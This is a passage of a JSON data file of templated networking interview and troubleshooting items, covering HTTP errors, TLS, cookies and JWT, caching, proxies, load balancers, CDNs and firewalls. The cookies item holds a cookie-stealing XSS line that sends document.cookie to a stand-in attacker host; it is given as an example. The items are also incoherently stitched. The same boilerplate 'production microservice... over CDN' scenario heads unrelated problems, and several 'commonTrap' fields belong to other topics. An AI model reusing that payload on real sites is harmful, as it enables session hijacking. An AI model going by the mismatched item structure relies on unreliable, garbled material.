      "attribution": "Interview-style (Technical Round)",
      "scenario": "What is the architectural difference between a 502 Bad Gateway and a 504 Gateway Timeout error in a microservices deployment?",
      "symptom": "Candidate is asked to provide deep architectural justification for HTTP Status Codes.",
      "coreConcept": "HTTP status codes are standardized 3-digit numerical responses issued by a server indicating the outcome of a client's HTTP request, categorized into 5 functional classes.",
      "analysis": [
        "1. State the architectural definitions and underlying layer contracts.",
        "2. Analyze the trade-offs between performance, latency, and reliability.",
        "3. Address the key technical requirement: Both 502 and 504 are returned by intermediary proxies (such as NGINX, AWS ALB, or Cloudflare) acting as gateways to upst..."
      ],
      "solution": "Both 502 and 504 are returned by intermediary proxies (such as NGINX, AWS ALB, or Cloudflare) acting as gateways to upstream backend application servers. 1. 502 Bad Gateway: The reverse proxy contacted the upstream backend server, but the backend server returned an invalid response, reset the connection, or crashed unexpectedly (e.g. process died, out-of-memory crash, port closed). 2. 504 Gateway Timeout: The reverse proxy successfully established contact with the upstream backend, but the backend server failed to finish computing and returning a response within the proxy's configured timeout window (e.g. a slow database query ran for 60 seconds when `proxy_read_timeout` was set to 30 seconds).",
      "commonTrap": "301 and 302 redirects behave identically in browsers and search engines."
    }
  ],
  "tls-ssl-handshake": [
    {
      "id": "tls-ssl-handshake-prob-1",
      "topicId": "tls-ssl-handshake",
      "title": "Troubleshooting TLS 1.2 vs TLS 1.3 Handshake & Cryptographic Exchange: Production Incident",
      "difficulty": "Medium",
      "attribution": "Placement-style (Amazon / Cisco)",
      "scenario": "A production microservice reports connectivity anomalies when communicating with an internal database over TLS 1.2 vs TLS 1.3 Handshake & Cryptographic Exchange.",
      "symptom": "Under TLS 1.2, completing TCP (1-RTT) + TLS (2-RTT) consumed 3 Round Trips = 450 ms before a single byte of data was sent.",
      "coreConcept": "Elliptic Curve Diffie-Hellman Ephemeral (ECDHE) allows client and server to compute the exact same symmetric encryption key independently without ever sending the key across the wire.",
      "analysis": [
        "1. Isolate the affected OSI layer associated with TLS 1.2 vs TLS 1.3 Handshake & Cryptographic Exchange.",
        "2. Inspect the diagnostic logs: A mobile banking app connects to an API server in another continent with 150 ms network latency.",
        "3. Examine the failure mode: TLS 1.3 allows RSA static key exchange.",
        "4. Apply root cause verification: RSA key exchange lacks Forward Secrecy; if the server's private key is leaked in the future, all past recorded traffic can be decrypted."
      ],
      "solution": "Correct operational implementation: TLS 1.3 completely banned RSA static key exchange, mandating Ephemeral Diffie-Hellman (ECDHE) for Perfect Forward Secrecy.",
      "commonTrap": "TLS 1.3 allows RSA static key exchange."
    },
    {
      "id": "tls-ssl-handshake-prob-2",
      "topicId": "tls-ssl-handshake",
      "title": "Interview Scenario: What is Perfect Forward Secrecy (PFS) and why...",
      "difficulty": "Hard",
      "attribution": "Interview-style (Technical Round)",
      "scenario": "What is Perfect Forward Secrecy (PFS) and why did TLS 1.3 make it mandatory?",
      "symptom": "Candidate is asked to provide deep architectural justification for TLS 1.2 vs TLS 1.3 Handshake & Cryptographic Exchange.",
      "coreConcept": "The Transport Layer Security (TLS) handshake is the cryptographic protocol that negotiates cipher suites, authenticates the server via digital certificates, and establishes shared symmetric encryption keys before application data transmits.",
      "analysis": [
        "1. State the architectural definitions and underlying layer contracts.",
        "2. Analyze the trade-offs between performance, latency, and reliability.",
        "3. Address the key technical requirement: Perfect Forward Secrecy (PFS) is a cryptographic property ensuring that even if an attacker records encrypted network tr..."
      ],
      "solution": "Perfect Forward Secrecy (PFS) is a cryptographic property ensuring that even if an attacker records encrypted network traffic today and steals the server's private key 10 years in the future, the attacker still CANNOT decrypt the historical recorded traffic. In older systems (TLS 1.2 with RSA key exchange), the client encrypted the master pre-secret with the server's static public key; compromising the server's private key in the future broke all past sessions. With Perfect Forward Secrecy (using Ephemeral Diffie-Hellman, ECDHE), unique, temporary session keys are negotiated for each individual connection and immediately erased from RAM after the session ends. Because the ephemeral keys were never saved to disk, compromising the server's private key in the future yields zero decryption capability. TLS 1.3 made PFS mandatory by removing static RSA key exchange entirely.",
      "commonTrap": "SSL and TLS are two completely different competing encryption protocols."
    }
  ],
  "cookies-and-sessions": [
    {
      "id": "cookies-and-sessions-prob-1",
      "topicId": "cookies-and-sessions",
      "title": "Troubleshooting Cookies, Sessions, JWT & State Management over HTTP: Production Incident",
      "difficulty": "Medium",
      "attribution": "Placement-style (Amazon / Cisco)",
      "scenario": "A production microservice reports connectivity anomalies when communicating with an internal database over Cookies, Sessions, JWT & State Management over HTTP.",
      "symptom": "The script attempts to execute `fetch('https://attacker.com/steal?c=' + document.cookie)` to steal logged-in users' session tokens.",
      "coreConcept": "Server sends a `Set-Cookie` header on login. The browser automatically stores the cookie and sends it back in the `Cookie` header on every subsequent request to that domain.",
      "analysis": [
        "1. Isolate the affected OSI layer associated with Cookies, Sessions, JWT & State Management over HTTP.",
        "2. Inspect the diagnostic logs: An attacker injects a malicious `<script>` tag into a forum comment (Stored XSS).",
        "3. Examine the failure mode: Storing sensitive JWT access tokens in browser `localStorage` is completely safe.",
        "4. Apply root cause verification: `localStorage` is globally accessible to ANY JavaScript running on the page."
      ],
      "solution": "Correct operational implementation: Any Cross-Site Scripting (XSS) vulnerability can immediately read `localStorage`. Store authentication tokens in `HttpOnly` cookies.",
      "commonTrap": "Storing sensitive JWT access tokens in browser `localStorage` is completely safe."
    },
    {
      "id": "cookies-and-sessions-prob-2",
      "topicId": "cookies-and-sessions",
      "title": "Interview Scenario: What is the trade-off between Server-Side Ses...",
      "difficulty": "Hard",
      "attribution": "Interview-style (Technical Round)",
      "scenario": "What is the trade-off between Server-Side Sessions (stored in Redis) and Stateless JSON Web Tokens (JWT)?",
      "symptom": "Candidate is asked to provide deep architectural justification for Cookies, Sessions, JWT & State Management over HTTP.",
      "coreConcept": "Techniques used to simulate continuous stateful sessions over the architecturally stateless HTTP protocol, comparing server-side sessions, browser cookies, and cryptographically signed JSON Web Tokens (JWT).",
      "analysis": [
        "1. State the architectural definitions and underlying layer contracts.",
        "2. Analyze the trade-offs between performance, latency, and reliability.",
        "3. Address the key technical requirement: 1. Server-Side Sessions: The client stores only a random, opaque session ID cookie. The server stores user session data ..."
      ],
      "solution": "1. Server-Side Sessions: The client stores only a random, opaque session ID cookie. The server stores user session data in a fast in-memory store like Redis. Pros: Instant revocation (logging out or banning a user immediately deletes the Redis key); small cookie payload. Cons: Requires scaling and clustering the central Redis state store across all server regions. 2. Stateless JWT: The server signs user claims (user ID, permissions, expiration) cryptographically and sends the token to the client. Pros: Completely stateless—any microservice can verify the signature using the public key without querying a central database, making it ideal for distributed horizontal scaling. Cons: Impossible to revoke instantly before expiration without building a stateful blocklist; larger payload size sent on every request; risk of token theft via XSS if stored in localStorage.",
      "commonTrap": "A JWT token cannot be read by anyone because it is encrypted."
    }
  ],
  "web-caching": [
    {
      "id": "web-caching-prob-1",
      "topicId": "web-caching",
      "title": "Troubleshooting Web Caching, Cache-Control Headers & ETag Validation: Production Incident",
      "difficulty": "Medium",
      "attribution": "Placement-style (Amazon / Cisco)",
      "scenario": "A production microservice reports connectivity anomalies when communicating with an internal database over Web Caching, Cache-Control Headers & ETag Validation.",
      "symptom": "The server previously sent `Cache-Control: max-age=31536000` (1 year) on `app.js`. Browsers refuse to check the server for 1 year.",
      "coreConcept": "HTTP headers (`Cache-Control`, `ETag`, `Last-Modified`) instruct browsers and CDNs whether to serve local cached copies or validate changes using 304 Not Modified conditional requests.",
      "analysis": [
        "1. Isolate the affected OSI layer associated with Web Caching, Cache-Control Headers & ETag Validation.",
        "2. Inspect the diagnostic logs: A frontend engineer deploys a bug fix to `app.js`, but users still see the broken version.",
        "3. Examine the failure mode: `Cache-Control: no-cache` means the browser will never cache the file.",
        "4. Apply root cause verification: `no-cache` DOES cache the file! It simply requires validating with the server before using it."
      ],
      "solution": "Correct operational implementation: To completely prevent caching, you MUST use `Cache-Control: no-store`.",
      "commonTrap": "`Cache-Control: no-cache` means the browser will never cache the file."
    },
    {
      "id": "web-caching-prob-2",
      "topicId": "web-caching",
      "title": "Interview Scenario: What is the difference between `Cache-Control...",
      "difficulty": "Hard",
      "attribution": "Interview-style (Technical Round)",
      "scenario": "What is the difference between `Cache-Control: no-cache` and `Cache-Control: no-store`?",
      "symptom": "Candidate is asked to provide deep architectural justification for Web Caching, Cache-Control Headers & ETag Validation.",
      "coreConcept": "Web caching is the technique of storing copies of HTTP responses in browser memory, local disk, forward proxies, or CDN edge nodes to serve future identical requests without contacting the origin server.",
      "analysis": [
        "1. State the architectural definitions and underlying layer contracts.",
        "2. Analyze the trade-offs between performance, latency, and reliability.",
        "3. Address the key technical requirement: This is one of the most common web interview questions: 1. `no-cache`: Instructs the browser or CDN that it CAN store a ..."
      ],
      "solution": "This is one of the most common web interview questions: 1. `no-cache`: Instructs the browser or CDN that it CAN store a copy of the response in its cache, but it MUST re-validate that cached copy with the origin server (using conditional headers like `If-None-Match: <ETag>`) before serving it to the user. If the server replies `304 Not Modified`, the cached copy is used. It means: 'Cache it, but check with me before using it.' 2. `no-store`: Strictly forbids the browser, CDN, or any intermediate proxy from saving ANY copy of the response to disk or memory under any circumstances. Every single request must download the full payload from the origin server. It is reserved for sensitive, confidential data like banking balances, passwords, and private medical records.",
      "commonTrap": "304 Not Modified responses re-download the entire file payload."
    }
  ],
  "url-lifecycle": [
    {
      "id": "url-lifecycle-prob-1",
      "topicId": "url-lifecycle",
      "title": "Troubleshooting Complete URL Lifecycle: Production Incident",
      "difficulty": "Medium",
      "attribution": "Placement-style (Amazon / Cisco)",
      "scenario": "A production microservice reports connectivity anomalies when communicating with an internal database over Complete URL Lifecycle.",
      "symptom": "The candidate must demonstrate mastery across OS internals, networking protocols, security, and web rendering without rambling.",
      "coreConcept": "Deconstructs the journey into 7 clear phases: URL Parsing -> DNS Resolution -> TCP Handshake -> TLS Negotiation -> HTTP Request/Response -> Server Processing -> DOM Rendering.",
      "analysis": [
        "1. Isolate the affected OSI layer associated with Complete URL Lifecycle.",
        "2. Inspect the diagnostic logs: A candidate is asked: 'What happens when you type https://google.com into your browser and press Enter?'",
        "3. Examine the failure mode: The browser sends the HTTP request before the TLS handshake.",
        "4. Apply root cause verification: HTTP data would travel unencrypted."
      ],
      "solution": "Correct operational implementation: The TCP handshake completes first, then the TLS handshake encrypts the connection, THEN the HTTP request is transmitted.",
      "commonTrap": "The browser sends the HTTP request before the TLS handshake."
    },
    {
      "id": "url-lifecycle-prob-2",
      "topicId": "url-lifecycle",
      "title": "Interview Scenario: Walk me through the exact networking sequence...",
      "difficulty": "Hard",
      "attribution": "Interview-style (Technical Round)",
      "scenario": "Walk me through the exact networking sequence of typing a URL into a browser from DNS to the first HTTP byte.",
      "symptom": "Candidate is asked to provide deep architectural justification for Complete URL Lifecycle.",
      "coreConcept": "The universal software engineering interview question detailing the complete end-to-end journey from user keystroke to pixels rendering on the screen across all networking and OS layers.",
      "analysis": [
        "1. State the architectural definitions and underlying layer contracts.",
        "2. Analyze the trade-offs between performance, latency, and reliability.",
        "3. Address the key technical requirement: 1. URL Parsing: Browser extracts protocol (HTTPS), domain (example.com), and checks HSTS cache. 2. DNS Resolution: Brows..."
      ],
      "solution": "1. URL Parsing: Browser extracts protocol (HTTPS), domain (example.com), and checks HSTS cache. 2. DNS Resolution: Browser checks local cache. If miss, sends UDP packet to recursive resolver (port 53). Resolver queries Root ('.'), TLD ('.com'), and Authoritative server, returning IPv4 address 93.184.216.34. 3. Local Routing & ARP: OS checks routing table, identifies destination is outside local subnet, and uses ARP cache to resolve Default Gateway's MAC address. 4. TCP 3-Way Handshake: Client sends TCP SYN to server on port 443; server replies SYN-ACK; client returns ACK. Connection is ESTABLISHED (1-RTT). 5. TLS 1.3 Handshake: Client sends ClientHello with Diffie-Hellman key share; server returns ServerHello, Certificate, and key share; mutual symmetric session keys derived (1-RTT). 6. HTTP Request: Client sends encrypted `GET / HTTP/1.1` request. Server processes request and streams back `200 OK` with HTML payload. 7. Rendering: Browser parses HTML to construct DOM Tree, parses CSS for CSSOM, builds Render Tree, calculates Layout, and paints pixels on screen.",
      "commonTrap": "DNS query is sent over a TCP connection."
    }
  ],
  "ping-and-traceroute": [
    {
      "id": "ping-and-traceroute-prob-1",
      "topicId": "ping-and-traceroute",
      "title": "Troubleshooting Ping & Traceroute Mechanics: Production Incident",
      "difficulty": "Medium",
      "attribution": "Placement-style (Amazon / Cisco)",
      "scenario": "A production microservice reports connectivity anomalies when communicating with an internal database over Ping & Traceroute Mechanics.",
      "symptom": "Is the server slow, or is a telecommunication provider link routing traffic inefficiently?",
      "coreConcept": "Ping sends ICMP Type 8 Echo Requests; Traceroute sends packets with incrementing TTL (1, 2, 3...) to trigger ICMP Type 11 Time Exceeded replies from each router hop.",
      "analysis": [
        "1. Isolate the affected OSI layer associated with Ping & Traceroute Mechanics.",
        "2. Inspect the diagnostic logs: An enterprise employee reports that connecting to the corporate ERP server in Frankfurt is taking 800 ms instead of the normal 120 ms.",
        "3. Examine the failure mode: An asterisk (*) on one hop in a traceroute proves the network is broken.",
        "4. Apply root cause verification: Many core routers prioritize packet forwarding over responding to ICMP diagnostic queries."
      ],
      "solution": "Correct operational implementation: An asterisk often just means that specific router ignores ICMP; if subsequent hops reply, the network path is fully healthy.",
      "commonTrap": "An asterisk (*) on one hop in a traceroute proves the network is broken."
    },
    {
      "id": "ping-and-traceroute-prob-2",
      "topicId": "ping-and-traceroute",
      "title": "Interview Scenario: Why does Windows `tracert` behave differently...",
      "difficulty": "Hard",
      "attribution": "Interview-style (Technical Round)",
      "scenario": "Why does Windows `tracert` behave differently than Linux `traceroute`?",
      "symptom": "Candidate is asked to provide deep architectural justification for Ping & Traceroute Mechanics.",
      "coreConcept": "Ping measures point-to-point network reachability and round-trip latency using ICMP Echo messages. Traceroute maps the exact intermediate router hops along a network path by intentionally exploiting IP Time-To-Live (TTL) expiration.",
      "analysis": [
        "1. State the architectural definitions and underlying layer contracts.",
        "2. Analyze the trade-offs between performance, latency, and reliability.",
        "3. Address the key technical requirement: Windows `tracert` and Linux `traceroute` use the exact same TTL-incrementing mechanism, but transmit different underlyin..."
      ],
      "solution": "Windows `tracert` and Linux `traceroute` use the exact same TTL-incrementing mechanism, but transmit different underlying packet types: 1. Windows `tracert` sends ICMP Echo Request packets (Type 8) with incrementing TTLs. When the destination is reached, the destination returns an ICMP Echo Reply (Type 0). 2. Linux `traceroute` by default sends UDP datagrams to deliberately obscure, invalid high port numbers (ports 33434 through 33534). Intermediate routers still return ICMP Type 11 (TTL Exceeded), but when the packet reaches the final destination, the destination sees that no application is listening on that UDP port and returns an ICMP Type 3 Code 3 (Destination Port Unreachable) message, signaling the end of the trace. (Linux can be told to use ICMP via `traceroute -I`).",
      "commonTrap": "Ping packet round-trip time measures bandwidth speed."
    }
  ],
  "firewall": [
    {
      "id": "firewall-prob-1",
      "topicId": "firewall",
      "title": "Troubleshooting Firewalls: Packet Filtering, Stateful Inspection & WAF: Production Incident",
      "difficulty": "Medium",
      "attribution": "Placement-style (Amazon / Cisco)",
      "scenario": "A production microservice reports connectivity anomalies when communicating with an internal database over Firewalls: Packet Filtering, Stateful Inspection & WAF.",
      "symptom": "The company firewall blocks all unsolicited inbound connections from the Internet.",
      "coreConcept": "Inspects packet headers and payloads against Access Control Lists (ACLs), tracks TCP connection state tables, and performs deep packet inspection (DPI) to block malicious traffic.",
      "analysis": [
        "1. Isolate the affected OSI layer associated with Firewalls: Packet Filtering, Stateful Inspection & WAF.",
        "2. Inspect the diagnostic logs: An internal employee visits a news website. The news server sends back HTML and image packets.",
        "3. Examine the failure mode: A stateful firewall requires separate rules for outbound requests and inbound replies.",
        "4. Apply root cause verification: Stateful firewalls automatically track connection state."
      ],
      "solution": "Correct operational implementation: Stateful firewalls automatically permit return traffic matching an established outbound session in their state table.",
      "commonTrap": "A stateful firewall requires separate rules for outbound requests and inbound replies."
    },
    {
      "id": "firewall-prob-2",
      "topicId": "firewall",
      "title": "Interview Scenario: What is the difference between a Stateless Pa...",
      "difficulty": "Hard",
      "attribution": "Interview-style (Technical Round)",
      "scenario": "What is the difference between a Stateless Packet Filter, a Stateful Firewall, and a Web Application Firewall (WAF)?",
      "symptom": "Candidate is asked to provide deep architectural justification for Firewalls: Packet Filtering, Stateful Inspection & WAF.",
      "coreConcept": "A firewall is a network security system that monitors, filters, and controls incoming and outgoing network traffic based on predetermined security rules, operating across Layers 3, 4, and 7.",
      "analysis": [
        "1. State the architectural definitions and underlying layer contracts.",
        "2. Analyze the trade-offs between performance, latency, and reliability.",
        "3. Address the key technical requirement: 1. Stateless Packet Filter (Layer 3/4): Inspects each packet in isolation against static rules (Source IP, Dest IP, Port..."
      ],
      "solution": "1. Stateless Packet Filter (Layer 3/4): Inspects each packet in isolation against static rules (Source IP, Dest IP, Port, Protocol). It has no memory of past packets and cannot tell if an incoming packet is a response to an outbound request. Fast hardware execution, but requires opening broad return port ranges. 2. Stateful Firewall (Layer 4): Tracks the state of active network connections in a dynamic state table. It validates TCP handshakes and automatically permits inbound return packets matching an active outbound session. Blocks unsolicited inbound scans. 3. Web Application Firewall (WAF / Layer 7): Operates at the Application Layer. It terminates TLS, parses HTTP headers, cookies, and POST bodies, and applies regex inspection to detect application-level exploits such as SQL Injection, Cross-Site Scripting (XSS), and remote code execution (e.g. Log4j).",
      "commonTrap": "A standard network firewall protects against SQL Injection and XSS attacks."
    }
  ],
  "proxy-servers": [
    {
      "id": "proxy-servers-prob-1",
      "topicId": "proxy-servers",
      "title": "Troubleshooting Forward Proxy Servers & Anonymity Mechanics: Production Incident",
      "difficulty": "Medium",
      "attribution": "Placement-style (Amazon / Cisco)",
      "scenario": "A production microservice reports connectivity anomalies when communicating with an internal database over Forward Proxy Servers & Anonymity Mechanics.",
      "symptom": "Employees connect over encrypted HTTPS, hiding the URL path and payload from standard network firewalls.",
      "coreConcept": "Clients configure their browsers to send all outbound requests to the proxy IP. The proxy establishes connections to destination web servers on the client's behalf.",
      "analysis": [
        "1. Isolate the affected OSI layer associated with Forward Proxy Servers & Anonymity Mechanics.",
        "2. Inspect the diagnostic logs: A financial bank blocks employee workstations from uploading proprietary source code to personal cloud storage (Dropbox / Google Drive).",
        "3. Examine the failure mode: A Forward Proxy and a Reverse Proxy are the exact same thing.",
        "4. Apply root cause verification: They sit on opposite sides of the Internet."
      ],
      "solution": "Correct operational implementation: A Forward Proxy represents and protects the CLIENTS; a Reverse Proxy represents and protects the SERVERS.",
      "commonTrap": "A Forward Proxy and a Reverse Proxy are the exact same thing."
    },
    {
      "id": "proxy-servers-prob-2",
      "topicId": "proxy-servers",
      "title": "Interview Scenario: What is the architectural difference between ...",
      "difficulty": "Hard",
      "attribution": "Interview-style (Technical Round)",
      "scenario": "What is the architectural difference between a Forward Proxy and a Reverse Proxy?",
      "symptom": "Candidate is asked to provide deep architectural justification for Forward Proxy Servers & Anonymity Mechanics.",
      "coreConcept": "A Forward Proxy is an intermediary server that sits between client devices and the public Internet, intercepting outbound requests to provide anonymity, caching, content filtering, and corporate security enforcement.",
      "analysis": [
        "1. State the architectural definitions and underlying layer contracts.",
        "2. Analyze the trade-offs between performance, latency, and reliability.",
        "3. Address the key technical requirement: 1. Forward Proxy (Client-Facing): Sits in front of client devices. Clients explicitly configure their browsers or networ..."
      ],
      "solution": "1. Forward Proxy (Client-Facing): Sits in front of client devices. Clients explicitly configure their browsers or network gateways to route through it. The destination web server has no idea who the real client is; it only sees the Forward Proxy's IP address. Primary purposes: client anonymity, bypassing geo-restrictions, corporate content filtering, and outbound caching. 2. Reverse Proxy (Server-Facing): Sits in front of origin backend servers. Clients connect to the reverse proxy's public IP thinking it is the actual website. The reverse proxy terminates the connection and forwards the request to internal backend microservices. The client has no idea which backend server handled the request. Primary purposes: load balancing, SSL/TLS termination, DDoS protection, web caching, and hiding internal microservice topology.",
      "commonTrap": "Standard forward proxies can inspect HTTPS payloads without any client configuration."
    }
  ],
  "reverse-proxy": [
    {
      "id": "reverse-proxy-prob-1",
      "topicId": "reverse-proxy",
      "title": "Troubleshooting Reverse Proxy: Production Incident",
      "difficulty": "Medium",
      "attribution": "Placement-style (Amazon / Cisco)",
      "scenario": "A production microservice reports connectivity anomalies when communicating with an internal database over Reverse Proxy.",
      "symptom": "How can the company expose all 20 services under a single domain (example.com) with one SSL certificate?",
      "coreConcept": "Reverse proxies terminate TLS connections in hardware, serve cached static assets, compress payloads with Gzip/Brotli, and route requests across internal backend servers.",
      "analysis": [
        "1. Isolate the affected OSI layer associated with Reverse Proxy.",
        "2. Inspect the diagnostic logs: A company runs 20 internal Docker microservices written in Python, Node.js, and Java.",
        "3. Examine the failure mode: Backend servers behind a reverse proxy see the client's real IP address in `req.ip` by default.",
        "4. Apply root cause verification: The backend server connects to the reverse proxy, so `req.ip` is the PROXY's internal IP address."
      ],
      "solution": "Correct operational implementation: Backend servers must read the `X-Forwarded-For` header injected by the reverse proxy to identify the real client IP.",
      "commonTrap": "Backend servers behind a reverse proxy see the client's real IP address in `req.ip` by default."
    },
    {
      "id": "reverse-proxy-prob-2",
      "topicId": "reverse-proxy",
      "title": "Interview Scenario: What is 'SSL Termination' (SSL Offloading) on...",
      "difficulty": "Hard",
      "attribution": "Interview-style (Technical Round)",
      "scenario": "What is 'SSL Termination' (SSL Offloading) on a reverse proxy, and what are its architectural advantages and security considerations?",
      "symptom": "Candidate is asked to provide deep architectural justification for Reverse Proxy.",
      "coreConcept": "A Reverse Proxy is a server that sits in front of one or more origin web servers, intercepting incoming client requests and routing them to appropriate backend microservices while providing SSL termination, caching, and security.",
      "analysis": [
        "1. State the architectural definitions and underlying layer contracts.",
        "2. Analyze the trade-offs between performance, latency, and reliability.",
        "3. Address the key technical requirement: SSL Termination is the practice of terminating and decrypting incoming HTTPS connections at the reverse proxy perimeter,..."
      ],
      "solution": "SSL Termination is the practice of terminating and decrypting incoming HTTPS connections at the reverse proxy perimeter, before forwarding the decrypted HTTP requests over the internal private network to backend application servers. Architectural Advantages: 1. CPU Offloading: Decrypting asymmetric ciphers is computationally expensive; offloading crypto to the reverse proxy frees up backend application servers to focus on business logic. 2. Centralized Certificate Management: Only the reverse proxy needs certificate renewals (Let's Encrypt / DigiCert); backend servers do not require individual certificates. 3. Payload Inspection & Caching: Allows the proxy to inspect HTTP headers, compress responses (gzip/brotli), and cache static assets. Security Consideration: Traffic between the reverse proxy and backend servers travels unencrypted in cleartext. In Zero-Trust architectures (HIPAA, PCI-DSS), 'SSL Bridging' (re-encrypting traffic between proxy and backend) is required.",
      "commonTrap": "A reverse proxy cannot cache dynamic API responses."
    }
  ],
  "load-balancer": [
    {
      "id": "load-balancer-prob-1",
      "topicId": "load-balancer",
      "title": "Troubleshooting Load Balancers: Production Incident",
      "difficulty": "Medium",
      "attribution": "Placement-style (Amazon / Cisco)",
      "scenario": "A production microservice reports connectivity anomalies when communicating with an internal database over Load Balancers.",
      "symptom": "If requests continue routing to Server #3, 20% of customer checkout attempts will fail.",
      "coreConcept": "A load balancer distributes requests across server pools using algorithms (Round Robin, Least Connections, IP Hash) and stops sending traffic to unhealthy nodes.",
      "analysis": [
        "1. Isolate the affected OSI layer associated with Load Balancers.",
        "2. Inspect the diagnostic logs: A retail website handles 100,000 requests per minute across 5 backend servers. Server #3 experiences a kernel panic and crashes.",
        "3. Examine the failure mode: Round Robin is the best algorithm for long-lived database connections or file uploads.",
        "4. Apply root cause verification: Some requests take 100ms while others take 10 minutes, causing server imbalance."
      ],
      "solution": "Correct operational implementation: For requests with uneven processing times, Least Connections or Weighted Least Connections is vastly superior to Round Robin.",
      "commonTrap": "Round Robin is the best algorithm for long-lived database connections or file uploads."
    },
    {
      "id": "load-balancer-prob-2",
      "topicId": "load-balancer",
      "title": "Interview Scenario: What are the key trade-offs between Layer 4 (...",
      "difficulty": "Hard",
      "attribution": "Interview-style (Technical Round)",
      "scenario": "What are the key trade-offs between Layer 4 (L4) and Layer 7 (L7) Load Balancers?",
      "symptom": "Candidate is asked to provide deep architectural justification for Load Balancers.",
      "coreConcept": "A Load Balancer distributes incoming network traffic across a cluster of backend servers to optimize resource utilization, maximize throughput, minimize response latency, and prevent server overload.",
      "analysis": [
        "1. State the architectural definitions and underlying layer contracts.",
        "2. Analyze the trade-offs between performance, latency, and reliability.",
        "3. Address the key technical requirement: 1. Layer 4 (Transport Layer): Operates at IP and TCP/UDP port levels. It inspects only the first SYN packet, makes a rou..."
      ],
      "solution": "1. Layer 4 (Transport Layer): Operates at IP and TCP/UDP port levels. It inspects only the first SYN packet, makes a routing decision, and passes raw packets through via NAT or Direct Server Return (DSR). Pros: Extreme performance (millions of packets/sec), minimal CPU and memory overhead, protocol agnostic. Cons: Blind to application payload; cannot inspect HTTP headers, cookies, or URL paths; cannot terminate SSL/TLS. 2. Layer 7 (Application Layer): Operates at the HTTP/HTTPS layer. It terminates the TCP connection, decrypts SSL/TLS, and parses the full HTTP request (URL paths, headers, cookies, HTTP methods). Pros: Intelligent routing (e.g. /video -> media cluster, /checkout -> payments cluster), sticky sessions via cookies, SSL termination, and WAF security filtering. Cons: Higher CPU/RAM overhead; lower raw packet throughput compared to L4.",
      "commonTrap": "A Layer 4 load balancer can route requests based on HTTP cookies."
    }
  ],
  "cdn-content-delivery-network": [
    {
      "id": "cdn-content-delivery-network-prob-1",
      "topicId": "cdn-content-delivery-network",
      "title": "Troubleshooting CDN: Production Incident",
      "difficulty": "Medium",
      "attribution": "Placement-style (Amazon / Cisco)",
      "scenario": "A production microservice reports connectivity anomalies when communicating with an internal database over CDN.",
      "symptom": "The newspaper's single origin web server can only support 10,000 concurrent requests before crashing.",
      "coreConcept": "Uses BGP Anycast routing to direct users to their nearest physical edge data center, serving static assets (images, CSS, JS, video) directly from local SSD cache.",
      "analysis": [
        "1. Isolate the affected OSI layer associated with CDN.",
        "2. Inspect the diagnostic logs: A viral breaking news article attracts 50 million visitors within 10 minutes.",
        "3. Examine the failure mode: CDNs can only ever cache static images and CSS files.",
        "4. Apply root cause verification: Modern CDNs run Edge Compute (Cloudflare Workers, Lambda@Edge) and accelerate dynamic APIs."
      ],
      "solution": "Correct operational implementation: Modern CDNs terminate TCP/TLS at the edge and proxy dynamic API requests over optimized private fiber backbones.",
      "commonTrap": "CDNs can only ever cache static images and CSS files."
    },
    {
      "id": "cdn-content-delivery-network-prob-2",
      "topicId": "cdn-content-delivery-network",
      "title": "Interview Scenario: What is BGP Anycast and how do CDNs use it to...",
      "difficulty": "Hard",
      "attribution": "Interview-style (Technical Round)",
      "scenario": "What is BGP Anycast and how do CDNs use it to direct users to their nearest edge server?",
      "symptom": "Candidate is asked to provide deep architectural justification for CDN.",
      "coreConcept": "A Content Delivery Network (CDN) is a geographically distributed network of proxy edge servers (Points of Presence, PoPs) that cache and deliver web assets close to end users to minimize latency.",
      "analysis": [
        "1. State the architectural definitions and underlying layer contracts.",
        "2. Analyze the trade-offs between performance, latency, and reliability.",
        "3. Address the key technical requirement: BGP Anycast is an IP network addressing technique where multiple geographically distributed physical edge servers share ..."
      ],
      "solution": "BGP Anycast is an IP network addressing technique where multiple geographically distributed physical edge servers share and advertise the EXACT SAME IP address to global internet routers using BGP. When a client's computer sends a packet to that Anycast IP address, global Internet Service Provider (ISP) routers evaluate their BGP routing tables and automatically forward the packet along the shortest topological path (lowest AS-path hop count). Consequently, a user in Tokyo connects to the CDN's Tokyo data center, while a user in London connecting to the exact same IP address connects to the London data center. Anycast eliminates DNS geo-lookup latency, provides instant DDoS absorption across all global PoPs, and provides automatic failover if an edge site goes down.",
      "commonTrap": "Deploying a CDN completely eliminates the need for an origin server."
    }
  ],
  "network-troubleshooting": [
    {
      "id": "network-troubleshooting-prob-1",
      "topicId": "network-troubleshooting",
      "title": "Troubleshooting Network Troubleshooting Methodology: Production Incident",
      "difficulty": "Medium",
      "attribution": "Placement-style (Amazon / Cisco)",
      "scenario": "A production microservice reports connectivity anomalies when communicating with an internal database over Network Troubleshooting Methodology.",
      "symptom": "Where is the failure? User's Wi-Fi? Local DNS? Firewall? Server crashed? SSL expired?",
      "coreConcept": "Following the 7-layer OSI model bottom-up (L1 Physical -> L2 Link -> L3 Network -> L4 Transport -> L7 Application) isolates the exact point of failure within minutes.",
      "analysis": [
        "1. Isolate the affected OSI layer associated with Network Troubleshooting Methodology.",
        "2. Inspect the diagnostic logs: A user complains: 'I cannot open internal sales reports at https://reports.corp.com'.",
        "3. Examine the failure mode: Flushing DNS cache when the network cable is unplugged.",
        "4. Apply root cause verification: L1 physical connection is broken; L7 software operations cannot fix a disconnected cable."
      ],
      "solution": "Correct operational implementation: Always verify Layer 1 and Layer 2 link status before troubleshooting higher-layer DNS or application configurations.",
      "commonTrap": "Flushing DNS cache when the network cable is unplugged."
    },
    {
      "id": "network-troubleshooting-prob-2",
      "topicId": "network-troubleshooting",
      "title": "Interview Scenario: A user reports that they cannot access a webs...",
      "difficulty": "Hard",
      "attribution": "Interview-style (Technical Round)",
      "scenario": "A user reports that they cannot access a website using its domain name (https://example.com), but they CAN access it by typing its direct IP address (https://93.184.216.34) into the browser. What is the root cause, and how do you diagnose it?",
      "symptom": "Candidate is asked to provide deep architectural justification for Network Troubleshooting Methodology.",
      "coreConcept": "A systematic, disciplined engineering methodology for diagnosing, localizing, and resolving network connectivity and performance failures using a structured bottom-up or top-down approach.",
      "analysis": [
        "1. State the architectural definitions and underlying layer contracts.",
        "2. Analyze the trade-offs between performance, latency, and reliability.",
        "3. Address the key technical requirement: The root cause is a DNS (Domain Name System) failure. Because the user can reach the web server using its direct IP addr..."
      ],
